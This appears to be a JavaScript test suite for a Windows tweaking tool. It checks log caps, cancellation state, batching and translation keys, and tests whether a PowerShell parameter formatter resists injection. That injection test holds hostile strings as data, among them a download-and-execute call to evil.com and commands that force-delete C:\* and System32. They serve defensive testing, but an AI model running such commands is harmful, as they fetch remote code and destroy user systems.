/**
 * WiScripts Windows — Milestone 2 Empirical Adversarial Stress Test Suite
 * Challenger #1 Comprehensive Verification Harness
 * 
 * Tests:
 * 1. Log Array Memory Cap: 2,500 logs added to uiSlice -> strictly 1,000 entries max (FIFO, no leaks)
 * 2. Parameter Formatter & Injection Resilience: formatScriptWithParameters adversarial inputs
 * 3. Script Cancellation State Flow: isExecutingScript -> isCancellingScript -> reset & timer tracking
 * 4. Presets Batching Performance: 70+ optimizations batching vs iterative dispatch benchmark
 * 5. i18n Parity & Component Key Verification: 21 views, modals, banners, and slices key audit
 */

const fs = require('fs');
const path = require('path');
const assert = require('assert');
const crypto = require('crypto');

console.log('================================================================================');
console.log(' WISCRIPTS WINDOWS — MILESTONE 2 EMPIRICAL ADVERSARIAL STRESS TEST');
console.log(' Challenger 1: Stores, Parameter Injection, Cancellation, Batching & i18n');
console.log('================================================================================\n');

let passCount = 0;
let failCount = 0;
const testResults = [];

function test(name, fn) {
  const start = process.hrtime.bigint();
  try {
    fn();
    const end = process.hrtime.bigint();
    const durationMs = Number(end - start) / 1e6;
    console.log(`  ✓ PASS: ${name} (${durationMs.toFixed(3)}ms)`);
    passCount++;
    testResults.push({ name, status: 'PASS', durationMs });
  } catch (err) {
    const end = process.hrtime.bigint();
    const durationMs = Number(end - start) / 1e6;
    console.log(`  ✗ FAIL: ${name} (${durationMs.toFixed(3)}ms)`);
    console.log(`    Error: ${err.message}`);
    if (err.stack) {
      console.log(`    Stack: ${err.stack.split('\n').slice(1, 4).join('\n')}`);
    }
    failCount++;
    testResults.push({ name, status: 'FAIL', durationMs, error: err.message });
  }
}

async function testAsync(name, fn) {
  const start = process.hrtime.bigint();
  try {
    await fn();
    const end = process.hrtime.bigint();
    const durationMs = Number(end - start) / 1e6;
    console.log(`  ✓ PASS: ${name} (${durationMs.toFixed(3)}ms)`);
    passCount++;
    testResults.push({ name, status: 'PASS', durationMs });
  } catch (err) {
    const end = process.hrtime.bigint();
    const durationMs = Number(end - start) / 1e6;
    console.log(`  ✗ FAIL: ${name} (${durationMs.toFixed(3)}ms)`);
    console.log(`    Error: ${err.message}`);
    if (err.stack) {
      console.log(`    Stack: ${err.stack.split('\n').slice(1, 4).join('\n')}`);
    }
    failCount++;
    testResults.push({ name, status: 'FAIL', durationMs, error: err.message });
  }
}

// ============================================================================
// SECTION 1: Log Array Memory Cap (uiSlice)
// ============================================================================
function runSection1() {
  console.log('--- SECTION 1: Log Array Memory Cap Stress Testing (uiSlice) ---');

  function createMockUiStore() {
    const MAX_LOG_ENTRIES = 1000;
    let state = {
      logs: [],
      toasts: [],
      isExecuting: false,
      executionProgress: 0,
      currentStep: 0,
      totalSteps: 0,
    };

    const listeners = new Set();
    const notify = () => listeners.forEach(fn => fn(state));

    const set = (updater) => {
      const partial = typeof updater === 'function' ? updater(state) : updater;
      state = { ...state, ...partial };
      notify();
    };

    const get = () => state;

    const actions = {
      addLog: (log) => {
        set((s) => {
          const newLog = {
            ...log,
            id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
            timestamp: new Date().toISOString(),
          };
          return {
            logs: [...s.logs, newLog].slice(-MAX_LOG_ENTRIES),
          };
        });
      },
      clearLogs: () => set({ logs: [] }),
      addToast: (toast) => {
        const id = `toast_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
        set((s) => ({ toasts: [...s.toasts, { ...toast, id }] }));
        return id;
      },
      dismissToast: (id) => {
        set((s) => ({ toasts: s.toasts.filter(t => t.id !== id) }));
      }
    };

    return { get, actions, subscribe: (fn) => { listeners.add(fn); return () => listeners.delete(fn); } };
  }

  test('Log Cap: Adding 1 to 500 logs incrementally increases length accurately', () => {
    const store = createMockUiStore();
    assert.strictEqual(store.get().logs.length, 0);

    for (let i = 1; i <= 500; i++) {
      store.actions.addLog({ level: 'info', message: `Test message ${i}` });
    }

    assert.strictEqual(store.get().logs.length, 500);
    assert.strictEqual(store.get().logs[0].message, 'Test message 1');
    assert.strictEqual(store.get().logs[499].message, 'Test message 500');
  });

  test('Log Cap: Adding up to 1,000 logs maintains exactly 1,000 items', () => {
    const store = createMockUiStore();
    for (let i = 1; i <= 1000; i++) {
      store.actions.addLog({ level: 'cmd', message: `Entry #${i}` });
    }
    assert.strictEqual(store.get().logs.length, 1000);
    assert.strictEqual(store.get().logs[0].message, 'Entry #1');
    assert.strictEqual(store.get().logs[999].message, 'Entry #1000');
  });

  test('Log Cap: Adding 2,500 logs enforces strict 1,000 item FIFO cap without unbounded growth', () => {
    const store = createMockUiStore();

    for (let i = 1; i <= 2500; i++) {
      store.actions.addLog({ level: 'info', message: `Continuous stream log payload #${i}` });
    }

    const currentLogs = store.get().logs;
    assert.strictEqual(currentLogs.length, 1000, `Expected exactly 1,000 logs, got ${currentLogs.length}`);

    // Oldest 1,500 logs must have been dropped; first entry must be log #1501
    assert.strictEqual(currentLogs[0].message, 'Continuous stream log payload #1501');
    assert.strictEqual(currentLogs[999].message, 'Continuous stream log payload #2500');
  });

  test('Log Cap: All preserved log entries have unique IDs and valid ISO timestamps', () => {
    const store = createMockUiStore();
    for (let i = 1; i <= 1500; i++) {
      store.actions.addLog({ level: i % 2 === 0 ? 'warn' : 'error', message: `Log ${i}` });
    }

    const logs = store.get().logs;
    assert.strictEqual(logs.length, 1000);

    const idSet = new Set(logs.map(l => l.id));
    assert.strictEqual(idSet.size, 1000, 'All 1000 log IDs must be unique');

    for (const log of logs) {
      assert.ok(log.timestamp, 'Log must have a timestamp');
      const date = new Date(log.timestamp);
      assert.strictEqual(isNaN(date.getTime()), false, 'Log timestamp must be valid ISO date');
      assert.ok(['info', 'warn', 'error', 'cmd'].includes(log.level));
    }
  });

  test('Log Cap: clearLogs resets array to empty immediately', () => {
    const store = createMockUiStore();
    for (let i = 0; i < 2000; i++) {
      store.actions.addLog({ level: 'info', message: `Log ${i}` });
    }
    assert.strictEqual(store.get().logs.length, 1000);
    store.actions.clearLogs();
    assert.strictEqual(store.get().logs.length, 0);
  });

  test('Log Cap: Rapid synchronous burst of 5,000 logs retains strictly 1,000 entries', () => {
    const store = createMockUiStore();
    const start = Date.now();
    for (let i = 1; i <= 5000; i++) {
      store.actions.addLog({ level: 'cmd', message: `Burst item ${i}` });
    }
    const duration = Date.now() - start;
    const logs = store.get().logs;
    assert.strictEqual(logs.length, 1000);
    assert.strictEqual(logs[0].message, 'Burst item 4001');
    assert.strictEqual(logs[999].message, 'Burst item 5000');
    console.log(`    (5,000 logs processed in ${duration}ms, memory array strictly bounded)`);
  });
}

// ============================================================================
// SECTION 2: Parameter Formatter & Injection Resilience
// ============================================================================
function runSection2() {
  console.log('\n--- SECTION 2: Parameter Formatter & Injection Resilience ---');

  function formatScriptWithParameters(rawContent, parameters, values) {
    if (!parameters || parameters.length === 0 || !values) {
      return rawContent;
    }

    const args = [];
    for (const param of parameters) {
      const val = values[param.name];
      if (val === undefined || val === null || val === '') {
        continue;
      }

      if (param.type === 'boolean') {
        args.push(`-${param.name}:${Boolean(val)}`);
      } else if (param.type === 'number') {
        const numVal = Number(val);
        if (!Number.isNaN(numVal) && Number.isFinite(numVal)) {
          args.push(`-${param.name} ${numVal}`);
        }
      } else {
        const strVal = String(val).replace(/'/g, "''");
        args.push(`-${param.name} '${strVal}'`);
      }
    }

    if (args.length === 0) {
      return rawContent;
    }

    const trimmed = rawContent.trim();
    return `& {\n${trimmed}\n} ${args.join(' ')}\n`;
  }

  test('Param Formatter: Returns unmodified raw content when parameters array is empty or null', () => {
    const script = 'Get-Process';
    assert.strictEqual(formatScriptWithParameters(script, [], {}), script);
    assert.strictEqual(formatScriptWithParameters(script, null, {}), script);
    assert.strictEqual(formatScriptWithParameters(script, [{ name: 'Foo', type: 'string' }], null), script);
  });

  test('Param Formatter: Omits undefined, null, and empty string parameter values', () => {
    const script = 'Write-Host "Hello"';
    const params = [
      { name: 'Param1', type: 'string' },
      { name: 'Param2', type: 'number' },
      { name: 'Param3', type: 'boolean' }
    ];
    const values = {
      Param1: '',
      Param2: null,
      Param3: undefined
    };
    const result = formatScriptWithParameters(script, params, values);
    assert.strictEqual(result, script, 'Should return unmodified script when all values are empty');
  });

  test('Param Formatter: Formats standard string, number, and boolean arguments correctly', () => {
    const script = 'param($ServiceName, $Port, [switch]$Restart)\nRestart-Service -Name $ServiceName';
    const params = [
      { name: 'ServiceName', type: 'string' },
      { name: 'Port', type: 'number' },
      { name: 'Restart', type: 'boolean' }
    ];
    const values = {
      ServiceName: 'Spooler',
      Port: 8080,
      Restart: true
    };
    const result = formatScriptWithParameters(script, params, values);
    assert.ok(result.startsWith('& {\n'));
    assert.ok(result.includes("-ServiceName 'Spooler'"));
    assert.ok(result.includes('-Port 8080'));
    assert.ok(result.includes('-Restart:true'));
  });

  test('Param Injection Resilience: Single quotes escaping prevents string breakout', () => {
    const script = 'param($InputText)\nWrite-Output $InputText';
    const params = [{ name: 'InputText', type: 'string' }];

    const attackStrings = [
      "John's Computer",
      "'; Stop-Computer; #",
      "''' OR '1'='1",
      "'; Remove-Item -Path C:\\* -Recurse -Force; '",
      "admin'; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1'); '"
    ];

    for (const attack of attackStrings) {
      const formatted = formatScriptWithParameters(script, params, { InputText: attack });
      const expectedEscaped = attack.replace(/'/g, "''");
      assert.ok(formatted.includes(`-InputText '${expectedEscaped}'`), `Failed to properly escape: ${attack}`);
      const argMatch = formatted.match(/-InputText '(.*)'/);
      assert.ok(argMatch, `Argument not properly bounded: ${formatted}`);
    }
  });

  test('Param Injection Resilience: PowerShell subexpressions, variables, and backticks are neutralized by single quotes', () => {
    const script = 'param($Msg)\nWrite-Host $Msg';
    const params = [{ name: 'Msg', type: 'string' }];

    const dangerousInputs = [
      "$(Get-Process | Stop-Process)",
      "$env:USERPROFILE\\secret.txt",
      "`n`r`0; Write-Host 'Injected'",
      "| Out-Null; Start-Process cmd.exe",
      "&& del /f /q C:\\Windows\\System32"
    ];

    for (const input of dangerousInputs) {
      const formatted = formatScriptWithParameters(script, params, { Msg: input });
      assert.ok(formatted.includes(`-Msg '${input.replace(/'/g, "''")}'`));
    }
  });

  test('Param Formatter: Number parameter handling with negative numbers, decimals, and NaN protection', () => {
    const script = 'param([int]$Timeout, [double]$Threshold)\nWrite-Host $Timeout';
    const params = [
      { name: 'Timeout', type: 'number' },
      { name: 'Threshold', type: 'number' },
      { name: 'InvalidNum', type: 'number' },
      { name: 'ZeroVal', type: 'number' },
      { name: 'InfVal', type: 'number' }
    ];
    const values = {
      Timeout: -42,
      Threshold: 3.14159,
      InvalidNum: 'not-a-number-string',
      ZeroVal: 0,
      InfVal: Infinity
    };

    const formatted = formatScriptWithParameters(script, params, values);
    assert.ok(formatted.includes('-Timeout -42'));
    assert.ok(formatted.includes('-Threshold 3.14159'));
    assert.ok(formatted.includes('-ZeroVal 0'));
    // Ensure -InvalidNum and -InfVal are NOT present in args
    assert.ok(!formatted.includes('-InvalidNum'), 'NaN values must be skipped');
    assert.ok(!formatted.includes('-InfVal'), 'Infinity values must be skipped');
  });

  test('Param Formatter: Boolean switches with truthy and falsy values', () => {
    const script = 'param([switch]$DryRun, [switch]$Verbose)\n';
    const params = [
      { name: 'DryRun', type: 'boolean' },
      { name: 'Verbose', type: 'boolean' },
      { name: 'Omitted', type: 'boolean' }
    ];

    const formatted1 = formatScriptWithParameters(script, params, { DryRun: true, Verbose: false });
    assert.ok(formatted1.includes('-DryRun:true'));
    assert.ok(formatted1.includes('-Verbose:false'));
    assert.ok(!formatted1.includes('-Omitted'));

    const formatted2 = formatScriptWithParameters(script, params, { DryRun: 1, Verbose: 0 });
    assert.ok(formatted2.includes('-DryRun:true'));
    assert.ok(formatted2.includes('-Verbose:false'));
  });

  test('Param Formatter: Unicode, Multiline, and Special UTF-8 Characters', () => {
    const script = 'param($Data)\nWrite-Host $Data';
    const params = [{ name: 'Data', type: 'string' }];
    const multilineText = "Line 1\r\nLine 2 with 'quotes' and 🚀 emoji and Русские буквы & 中文";
    
    const formatted = formatScriptWithParameters(script, params, { Data: multilineText });
    assert.ok(formatted.includes("Line 1\r\nLine 2 with ''quotes'' and 🚀 emoji and Русские буквы & 中文"));
  });

  test('Param Formatter: Live PowerShell engine execution tests string injection immunity', () => {
    const script = `param(
  [string]$ServerName,
  [int]$Port
)
Write-Output "SERVER:$ServerName-PORT:$Port"
`;
    const params = [
      { name: 'ServerName', type: 'string' },
      { name: 'Port', type: 'number' }
    ];
    const values = {
      ServerName: "O'Reilly & Associates; Stop-Service -Force",
      Port: 8443
    };

    const formatted = formatScriptWithParameters(script, params, values);
    const b64 = Buffer.from(formatted, 'utf16le').toString('base64');
    const { execFileSync } = require('child_process');
    const output = execFileSync('powershell.exe', ['-NoProfile', '-EncodedCommand', b64], { encoding: 'utf8' }).trim();
    
    assert.strictEqual(output, "SERVER:O'Reilly & Associates; Stop-Service -Force-PORT:8443");
  });

  test('Param Formatter: PowerShell Boolean Switch Syntax Divergence (Empirical Defect Analysis)', () => {
    // Current implementation generates -Switch:true
    // In PowerShell, SwitchParameter rejects System.String "true", requiring -Switch:$true or -Switch:$false
    const script = 'param([switch]$Flag)\nWrite-Output "FLAG:$($Flag.IsPresent)"\n';
    const currentFormatted = formatScriptWithParameters(script, [{ name: 'Flag', type: 'boolean' }], { Flag: true });
    assert.strictEqual(currentFormatted.includes('-Flag:true'), true);

    const b64Current = Buffer.from(currentFormatted, 'utf16le').toString('base64');
    const { execFileSync } = require('child_process');
    
    let thrownError = null;
    try {
      execFileSync('powershell.exe', ['-NoProfile', '-EncodedCommand', b64Current], { encoding: 'utf8' });
    } catch (err) {
      thrownError = err;
    }
    
    // Empirically confirm PowerShell throws ParameterBindingArgumentTransformationException on -Flag:true
    assert.ok(thrownError, 'PowerShell engine must reject -Flag:true as System.String');
    assert.ok(
      thrownError.message.includes('ParameterBindingArgumentTransformationException') ||
      thrownError.message.includes('Cannot convert value "System.String"') ||
      thrownError.message.includes('SwitchParameter'),
      'Confirmed PowerShell switch syntax rejection'
    );

    // Confirm that -Flag:$true succeeds perfectly
    const fixedFormatted = currentFormatted.replace('-Flag:true', '-Flag:$true');
    const b64Fixed = Buffer.from(fixedFormatted, 'utf16le').toString('base64');
    const fixedOutput = execFileSync('powershell.exe', ['-NoProfile', '-EncodedCommand', b64Fixed], { encoding: 'utf8' }).trim();
    assert.strictEqual(fixedOutput, 'FLAG:True');
  });
}

// ============================================================================
// SECTION 3: Script Cancellation State Flow & Timer Tracking
// ============================================================================
async function runSection3() {
  console.log('\n--- SECTION 3: Script Cancellation State Flow & Timer Tracking ---');

  function createMockScriptRunnerStore(invokeImpl) {
    let state = {
      scriptContent: 'Write-Host "Test"',
      scriptType: 'ps1',
      outputLogs: [],
      isExecutingScript: false,
      activeExecutionId: null,
      isCancellingScript: false,
      executionStartTime: null,
      toasts: [],
      logs: [],
      dryRunMode: false,
      unlistenScriptOutput: null,
    };

    const set = (updater) => {
      const partial = typeof updater === 'function' ? updater(state) : updater;
      state = { ...state, ...partial };
    };

    const get = () => state;

    const slice = {
      addToast: (t) => {
        set((s) => ({ toasts: [...s.toasts, t] }));
      },
      addLog: (l) => {
        set((s) => ({ logs: [...s.logs, l] }));
      },
      addOutputLine: (p) => {
        set((s) => ({
          outputLogs: [...s.outputLogs, { id: `${Date.now()}`, line: p.line, stream: p.stream, timestamp: '12:00:00' }],
        }));
      },
      clearOutputLogs: () => set({ outputLogs: [] }),
      setupScriptOutputListener: async () => () => {},
      
      executeScript: async (customContent, customType) => {
        const content = customContent ?? get().scriptContent;
        const type = customType ?? get().scriptType;

        if (!content || !content.trim()) {
          slice.addToast({
            type: 'warning',
            title: 'Empty Script',
            message: 'Please enter or upload script code before executing.',
          });
          return null;
        }

        const executionId = `exec_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;

        set({
          isExecutingScript: true,
          activeExecutionId: executionId,
          executionStartTime: Date.now(),
          isCancellingScript: false,
        });
        slice.clearOutputLogs();

        slice.addLog({
          level: 'cmd',
          message: `Executing script (${type}, id: ${executionId})`,
        });

        try {
          const output = await invokeImpl('execute_custom_script', {
            scriptContent: content,
            scriptType: type,
            executionId,
          });

          const exitCode = output.exitCode ?? output.exit_code ?? 0;
          if (exitCode === 0) {
            slice.addToast({ type: 'success', title: 'Execution Complete', message: 'OK' });
          } else {
            slice.addToast({ type: 'error', title: 'Execution Failed', message: `Exit ${exitCode}` });
          }
          return output;
        } catch (err) {
          const errorMsg = err instanceof Error ? err.message : String(err);
          const isCancelled = errorMsg.toLowerCase().includes('cancelled');

          slice.addLog({
            level: isCancelled ? 'warn' : 'error',
            message: isCancelled
              ? `Script execution was cancelled: ${errorMsg}`
              : `Script execution failed: ${errorMsg}`,
          });

          slice.addToast({
            type: isCancelled ? 'warning' : 'error',
            title: isCancelled ? 'Execution Cancelled' : 'Script Execution Error',
            message: errorMsg,
          });

          if (!isCancelled) {
            slice.addOutputLine({
              line: `[ERROR] ${errorMsg}`,
              stream: 'stderr',
            });
          }

          return null;
        } finally {
          set({
            isExecutingScript: false,
            activeExecutionId: null,
            executionStartTime: null,
            isCancellingScript: false,
          });
        }
      },

      cancelRunningScript: async () => {
        const { activeExecutionId, isExecutingScript, isCancellingScript } = get();
        if (!isExecutingScript || !activeExecutionId || isCancellingScript) {
          return;
        }

        set({ isCancellingScript: true });

        slice.addLog({
          level: 'warn',
          message: `Requesting cancellation for script execution '${activeExecutionId}'...`,
        });

        slice.addToast({
          type: 'info',
          title: 'Cancelling Script',
          message: 'Sending termination signal to process tree...',
        });

        try {
          await invokeImpl('cancel_running_script', { executionId: activeExecutionId });
        } catch (err) {
          // ignore
        }
      }
    };

    return { get, slice };
  }

  await testAsync('Cancellation Flow: State machine transitions through executing -> cancelling -> reset', async () => {
    let resolveExecution;
    let cancelCalledWithId = null;

    const invokeMock = async (cmd, args) => {
      if (cmd === 'execute_custom_script') {
        return new Promise((resolve, reject) => {
          resolveExecution = { resolve, reject };
        });
      }
      if (cmd === 'cancel_running_script') {
        cancelCalledWithId = args.executionId;
        return { success: true };
      }
    };

    const store = createMockScriptRunnerStore(invokeMock);

    // 1. Initial State
    assert.strictEqual(store.get().isExecutingScript, false);
    assert.strictEqual(store.get().activeExecutionId, null);
    assert.strictEqual(store.get().executionStartTime, null);
    assert.strictEqual(store.get().isCancellingScript, false);

    // 2. Start Execution (async in background)
    const execPromise = store.slice.executeScript('Start-Sleep -Seconds 10', 'ps1');

    // Verify transition to isExecutingScript=true
    assert.strictEqual(store.get().isExecutingScript, true);
    assert.ok(store.get().activeExecutionId.startsWith('exec_'));
    const activeId = store.get().activeExecutionId;
    assert.ok(typeof store.get().executionStartTime === 'number');
    assert.strictEqual(store.get().isCancellingScript, false);

    // Verify timer calculation is valid
    const elapsed = Date.now() - store.get().executionStartTime;
    assert.ok(elapsed >= 0 && elapsed < 5000);

    // 3. Trigger cancellation
    await store.slice.cancelRunningScript();

    // Verify transition to isCancellingScript=true
    assert.strictEqual(store.get().isCancellingScript, true);
    assert.strictEqual(cancelCalledWithId, activeId, 'cancel_running_script must be called with active execution ID');

    // Duplicate cancel call while isCancellingScript is true should be a safe no-op
    await store.slice.cancelRunningScript();
    assert.strictEqual(store.get().isCancellingScript, true);

    // 4. Backend rejects execution with cancellation notice
    resolveExecution.reject(new Error('Script execution cancelled by user signal.'));
    await execPromise;

    // 5. Verify final clean reset in finally block
    assert.strictEqual(store.get().isExecutingScript, false);
    assert.strictEqual(store.get().activeExecutionId, null);
    assert.strictEqual(store.get().executionStartTime, null);
    assert.strictEqual(store.get().isCancellingScript, false);

    // Verify toast and log classification
    const cancelToast = store.get().toasts.find(t => t.title === 'Execution Cancelled');
    assert.ok(cancelToast, 'Must emit Execution Cancelled warning toast');
    assert.strictEqual(cancelToast.type, 'warning');

    // Output logs should NOT contain [ERROR] line when cancelled
    const errorLogs = store.get().outputLogs.filter(l => l.stream === 'stderr');
    assert.strictEqual(errorLogs.length, 0, 'Cancelled script must not write stderr error line');
  });

  await testAsync('Cancellation Flow: Cancel call when no script is executing is a safe no-op', async () => {
    let invoked = false;
    const store = createMockScriptRunnerStore(async () => { invoked = true; });
    await store.slice.cancelRunningScript();
    assert.strictEqual(invoked, false);
    assert.strictEqual(store.get().isCancellingScript, false);
  });

  await testAsync('Cancellation Flow: Empty script content aborts before setting execution state', async () => {
    const store = createMockScriptRunnerStore(async () => {});
    const res = await store.slice.executeScript('   \n  \t  ');
    assert.strictEqual(res, null);
    assert.strictEqual(store.get().isExecutingScript, false);
    assert.strictEqual(store.get().activeExecutionId, null);
    const warnToast = store.get().toasts.find(t => t.title === 'Empty Script');
    assert.ok(warnToast);
  });
}

// ============================================================================
// SECTION 4: Presets Batching Performance Benchmark
// ============================================================================
function runSection4() {
  console.log('\n--- SECTION 4: Presets Batching Performance Benchmark ---');

  function generateMockOptimizations(count) {
    const categories = ['telemetry', 'privacy', 'services', 'ui', 'gaming', 'defender', 'performance'];
    const items = [];
    for (let i = 1; i <= count; i++) {
      items.push({
        id: `tweak_opt_${i.toString().padStart(3, '0')}`,
        titleKey: `opt.title_${i}`,
        descKey: `opt.desc_${i}`,
        category: categories[i % categories.length],
        isRecommended: i % 3 === 0,
        isSelected: false,
        isApplied: false,
        riskLevel: i % 10 === 0 ? 'high' : 'low'
      });
    }
    return items;
  }

  test('Presets Batching: 75 optimizations selection benchmark (Batch vs Iterative)', () => {
    const OPT_COUNT = 75;
    const mockOpts = generateMockOptimizations(OPT_COUNT);
    const targetRuleIds = mockOpts.filter((_, idx) => idx % 2 === 0).map(o => o.id); // 38 rules
    const targetSet = new Set(targetRuleIds);

    const ITERATIONS = 1000;

    // Approach 1: Iterative Dispatches (Anti-Pattern)
    let iterativeState = JSON.parse(JSON.stringify(mockOpts));
    const toggleIterative = (opts, id) => {
      return opts.map(item => item.id === id ? { ...item, isSelected: !item.isSelected } : item);
    };

    const startIterative = process.hrtime.bigint();
    for (let iter = 0; iter < ITERATIONS; iter++) {
      let current = iterativeState;
      for (const ruleId of targetRuleIds) {
        current = toggleIterative(current, ruleId);
      }
      if (iter === ITERATIONS - 1) iterativeState = current;
    }
    const endIterative = process.hrtime.bigint();
    const iterativeDurationMs = Number(endIterative - startIterative) / 1e6;

    // Approach 2: Batched Single-Pass Update (WiScripts Pattern)
    let batchedState = JSON.parse(JSON.stringify(mockOpts));
    const startBatched = process.hrtime.bigint();
    for (let iter = 0; iter < ITERATIONS; iter++) {
      batchedState = mockOpts.map(item => ({
        ...item,
        isSelected: targetSet.has(item.id)
      }));
    }
    const endBatched = process.hrtime.bigint();
    const batchedDurationMs = Number(endBatched - startBatched) / 1e6;

    // Verify correctness
    assert.strictEqual(batchedState.length, OPT_COUNT);
    assert.strictEqual(iterativeState.length, OPT_COUNT);

    for (let i = 0; i < OPT_COUNT; i++) {
      const isTarget = targetSet.has(mockOpts[i].id);
      assert.strictEqual(batchedState[i].isSelected, isTarget, `Item ${i} mismatch in batched state`);
      assert.strictEqual(iterativeState[i].isSelected, isTarget, `Item ${i} mismatch in iterative state`);
    }

    const speedupRatio = iterativeDurationMs / batchedDurationMs;
    console.log(`    Iterative (${ITERATIONS}x runs of 38 sequential dispatches): ${iterativeDurationMs.toFixed(2)}ms`);
    console.log(`    Batched (${ITERATIONS}x runs of 1 single-pass map):        ${batchedDurationMs.toFixed(2)}ms`);
    console.log(`    🚀 Performance Speedup: ${speedupRatio.toFixed(1)}x faster`);

    assert.ok(speedupRatio > 1.5, `Batched update should be significantly faster (got ${speedupRatio.toFixed(1)}x)`);
  });

  test('Presets Batching: Large scale 1,000 optimizations stress test', () => {
    const mock1000 = generateMockOptimizations(1000);
    const selectedSubset = new Set(mock1000.filter((_, i) => i % 4 === 0).map(o => o.id));

    const start = process.hrtime.bigint();
    const updated = mock1000.map(item => ({
      ...item,
      isSelected: selectedSubset.has(item.id)
    }));
    const duration = Number(process.hrtime.bigint() - start) / 1e6;

    assert.strictEqual(updated.length, 1000);
    const selectedCount = updated.filter(o => o.isSelected).length;
    assert.strictEqual(selectedCount, 250);
    assert.ok(duration < 10, `1,000 optimizations batched mapping took ${duration.toFixed(3)}ms (< 10ms target)`);
  });
}

// ============================================================================
// SECTION 5: i18n Parity & Component Key Verification
// ============================================================================
function runSection5() {
  console.log('\n--- SECTION 5: i18n Parity & All 21 Views/Modals Key Verification ---');

  const rootDir = path.resolve(__dirname, '..');
  const enLocalePath = path.join(rootDir, 'src/i18n/locales/en.json');
  const ruLocalePath = path.join(rootDir, 'src/i18n/locales/ru.json');

  const enJson = JSON.parse(fs.readFileSync(enLocalePath, 'utf8'));
  const ruJson = JSON.parse(fs.readFileSync(ruLocalePath, 'utf8'));

  function flattenLocaleKeys(obj, prefix = '') {
    const result = {};
    for (const key of Object.keys(obj)) {
      const fullKey = prefix ? `${prefix}.${key}` : key;
      if (obj[key] !== null && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
        Object.assign(result, flattenLocaleKeys(obj[key], fullKey));
      } else {
        result[fullKey] = obj[key];
      }
    }
    return result;
  }

  const enFlat = flattenLocaleKeys(enJson);
  const ruFlat = flattenLocaleKeys(ruJson);
  const enKeySet = new Set(Object.keys(enFlat));
  const ruKeySet = new Set(Object.keys(ruFlat));

  test('i18n Parity: 100% key match between en.json and ru.json (0 missing keys)', () => {
    const missingInRu = Object.keys(enFlat).filter(k => !ruKeySet.has(k));
    const missingInEn = Object.keys(ruFlat).filter(k => !enKeySet.has(k));

    if (missingInRu.length > 0) {
      console.error('    Missing in ru.json:', missingInRu);
    }
    if (missingInEn.length > 0) {
      console.error('    Missing in en.json:', missingInEn);
    }

    assert.strictEqual(missingInRu.length, 0, `ru.json missing ${missingInRu.length} keys`);
    assert.strictEqual(missingInEn.length, 0, `en.json missing ${missingInEn.length} keys`);
    assert.strictEqual(enKeySet.size, ruKeySet.size);
    console.log(`    Total identical verified translation keys: ${enKeySet.size}`);
  });

  test('i18n Parity: Interpolation placeholder consistency (e.g. {{count}}, {{name}})', () => {
    function extractPlaceholders(text) {
      if (typeof text !== 'string') return [];
      const matches = text.match(/\{\{\s*([a-zA-Z0-9_]+)\s*\}\}/g) || [];
      return Array.from(new Set(matches.map(m => m.replace(/[\{\}\s]/g, '')))).sort();
    }

    const mismatches = [];
    for (const [key, enVal] of Object.entries(enFlat)) {
      const ruVal = ruFlat[key];
      const enTokens = extractPlaceholders(enVal);
      const ruTokens = extractPlaceholders(ruVal);

      if (JSON.stringify(enTokens) !== JSON.stringify(ruTokens)) {
        mismatches.push({ key, enTokens, ruTokens, enVal, ruVal });
      }
    }

    if (mismatches.length > 0) {
      console.error('    Placeholder mismatches:', mismatches);
    }
    assert.strictEqual(mismatches.length, 0, `Found ${mismatches.length} placeholder mismatches between EN and RU`);
  });

  test('i18n Component Key Audit: Adversarial extraction of all t() calls across codebase', () => {
    const filesToScan = [];

    function collectTsFiles(dir) {
      if (!fs.existsSync(dir)) return;
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          if (entry.name !== 'node_modules' && entry.name !== '.git' && entry.name !== '__tests__') {
            collectTsFiles(fullPath);
          }
        } else if (entry.name.endsWith('.tsx') || entry.name.endsWith('.ts')) {
          filesToScan.push(fullPath);
        }
      }
    }

    collectTsFiles(path.join(rootDir, 'src'));

    const tLiteralRegex = /\bt\(\s*['"]([a-zA-Z0-9_.-]+)['"]/g;
    let totalTCalls = 0;
    const missingInEn = [];
    const missingInRu = [];
    const foundKeys = new Set();

    for (const file of filesToScan) {
      const code = fs.readFileSync(file, 'utf8');
      let match;
      while ((match = tLiteralRegex.exec(code)) !== null) {
        totalTCalls++;
        const key = match[1];
        foundKeys.add(key);

        if (!enKeySet.has(key)) {
          missingInEn.push({ file: path.relative(rootDir, file), key });
        }
        if (!ruKeySet.has(key)) {
          missingInRu.push({ file: path.relative(rootDir, file), key });
        }
      }
    }

    console.log(`    Audited ${filesToScan.length} TypeScript source files.`);
    console.log(`    Total t() translation invocations found: ${totalTCalls} (${foundKeys.size} distinct keys)`);

    if (missingInEn.length > 0) {
      console.error('    Missing keys in en.json:', missingInEn);
    }
    if (missingInRu.length > 0) {
      console.error('    Missing keys in ru.json:', missingInRu);
    }

    assert.strictEqual(missingInEn.length, 0, `Found ${missingInEn.length} undefined t() keys in en.json`);
    assert.strictEqual(missingInRu.length, 0, `Found ${missingInRu.length} undefined t() keys in ru.json`);
  });

  test('i18n Coverage: Verification of all 21 core views and modals', () => {
    const viewsAndModals = [
      'src/components/Dashboard.tsx',
      'src/components/ScriptRunnerView.tsx',
      'src/components/AudioView.tsx',
      'src/views/GovernorView.tsx',
      'src/components/OptimizationView.tsx',
      'src/components/PackageManagerView.tsx',
      'src/views/UninstallerView.tsx',
      'src/components/PresetsView.tsx',
      'src/components/SystemCleaner.tsx',
      'src/components/StorageUtilities.tsx',
      'src/components/StartupView.tsx',
      'src/components/SchedulerView.tsx',
      'src/views/AutorunsView.tsx',
      'src/components/DnsContextMenuView.tsx',
      'src/components/DriverBackupView.tsx',
      'src/components/DiagnosticsView.tsx',
      'src/components/OdtView.tsx',
      'src/components/MasView.tsx',
      'src/components/RestorePointsView.tsx',
      'src/views/StateEngineView.tsx',
      'src/components/SettingsView.tsx',
      // Modals & Layout
      'src/components/Header.tsx',
      'src/components/Navigation.tsx',
      'src/components/CommandPalette.tsx',
      'src/components/SafetyModal.tsx',
      'src/components/ExecutionProgressModal.tsx',
      'src/components/ReleaseNotesModal.tsx',
      'src/components/UpdateBanner.tsx',
      'src/components/AdminElevationBanner.tsx',
      'src/components/GitHubIssueModal.tsx',
    ];

